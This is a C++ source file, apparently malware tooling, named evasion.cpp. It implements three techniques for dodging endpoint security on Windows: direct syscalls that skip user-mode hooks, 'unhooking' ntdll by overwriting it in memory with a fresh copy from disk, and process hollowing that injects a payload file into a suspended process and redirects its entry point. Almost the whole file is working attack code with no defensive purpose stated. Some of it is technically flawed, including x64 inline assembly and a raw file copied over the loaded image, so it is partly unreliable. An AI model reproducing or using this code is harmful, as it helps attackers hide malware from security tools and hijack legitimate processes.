// evasion.cpp - Syscall direct, DLL unhooking, process hollowing
#include <windows.h>
#include <stdio.h>

// Direct syscall for x64 (bypass user-mode hooks)
__declspec(naked) NTSTATUS NtCreateProcessEx() {
    __asm {
        mov rax, 0x18;        // syscall number for NtCreateProcessEx (varies by build)
        syscall;
        ret;
    }
}

void UnhookDLLs() {
    // Reload ntdll from fresh copy to bypass hooks
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID freshNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, fileSize);
    
    HMODULE loadedNtdll = GetModuleHandleA("ntdll.dll");
    if (loadedNtdll && freshNtdll) {
        // Overwrite loaded with fresh copy (simplified - actual implementation needs PE parsing)
        DWORD oldProtect;
        VirtualProtect(loadedNtdll, fileSize, PAGE_READWRITE, &oldProtect);
        memcpy(loadedNtdll, freshNtdll, fileSize);
        VirtualProtect(loadedNtdll, fileSize, oldProtect, &oldProtect);
    }
    
    UnmapViewOfFile(freshNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}

// Process hollowing for injection
BOOL HollowProcess(LPCSTR targetPath, LPCSTR payloadPath) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(STARTUPINFOA);
    
    // Create suspended process
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    // Read payload
    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    DWORD fileSize = GetFileSize(hFile, NULL);
    char* payload = (char*)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD bytesRead;
    ReadFile(hFile, payload, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    // Allocate memory in target process
    LPVOID remoteAddr = VirtualAllocEx(pi.hProcess, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remoteAddr, payload, fileSize, NULL);
    
    // Get context and set entry point
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD_PTR)remoteAddr;  // Set entry point (simplified)
    SetThreadContext(pi.hThread, &ctx);
    
    ResumeThread(pi.hThread);
    VirtualFree(payload, 0, MEM_RELEASE);
    return TRUE;
}
